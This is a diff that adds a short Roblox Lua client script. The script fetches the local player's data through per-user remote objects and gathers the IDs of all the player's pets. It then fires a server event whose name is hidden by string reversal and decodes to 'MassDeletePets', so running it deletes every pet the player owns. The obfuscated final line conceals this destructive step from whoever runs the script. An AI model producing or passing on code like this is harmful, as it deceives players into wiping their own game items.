@@ -1,0 +1,19 @@
+local PlayerService = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = PlayerService.LocalPlayer
+local Network = {}
+Network.RemoteEvent = ReplicatedStorage[LocalPlayer.UserId.."Event"]
+Network.RemoteFunction = ReplicatedStorage[LocalPlayer.UserId.."Function"]
+function Network:Fire(Event, ...)
+return self.RemoteEvent:FireServer(Event, ...)
+end
+function Network:Invoke(Event, ...)
+return self.RemoteFunction:InvokeServer(Event, ...)
+end
+local PlayerData = Network:Invoke("GetPlayerData")
+local IDs = {}
+for i,v in pairs(PlayerData.PETS) do
+    table.insert(IDs, v[1])
+end
+Network:Fire(("stePeteleDssaM"):reverse(), IDs)
